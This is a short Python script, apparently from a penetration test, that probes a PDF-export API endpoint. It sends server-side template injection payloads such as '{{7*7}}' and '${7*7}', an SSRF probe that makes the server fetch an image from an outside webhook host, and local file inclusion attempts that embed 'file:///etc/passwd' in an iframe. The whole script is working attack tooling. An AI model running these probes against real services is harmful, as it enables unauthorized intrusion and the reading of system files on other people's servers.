import json,subprocess,os,uuid
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']; WH=os.environ['WH']
def req(path,body,tok=None):
    cmd=['curl','-s','-m','90','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+(tok or T),'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='zx'+uuid.uuid4().hex[:8]
print("=== document_intelligence/export/pdf : SSTI ladder ===")
for payload in ['{{7*7}}','${7*7}','<%= 7*7 %>','#{7*7}','%{7*7}','ZXMARK']:
    c,b=req('/api/v1/document_intelligence/export/pdf',
            {"htmlContent":f"<p>{payload}</p>","fileName":f"zx-{tag}"})
    print(f"  {payload:14} -> {c} {b[:150].replace(chr(10),' ')}")
print("\n=== same endpoint : SSRF via img ===")
c,b=req('/api/v1/document_intelligence/export/pdf',
        {"htmlContent":f'<img src="{WH}/{tag}-di.png">',"fileName":f"zx-{tag}-ssrf"})
print(f"  -> {c} {b[:200].replace(chr(10),' ')}")
print("\n=== same endpoint : LFI ===")
for src in ['file:///etc/passwd','file:///etc/hostname','/etc/passwd']:
    c,b=req('/api/v1/document_intelligence/export/pdf',
            {"htmlContent":f'<iframe src="{src}"></iframe>',"fileName":f"zx-{tag}-lfi"})
    print(f"  {src:22} -> {c} {b[:140].replace(chr(10),' ')}")
open('/tmp/tag181','w').write(tag)
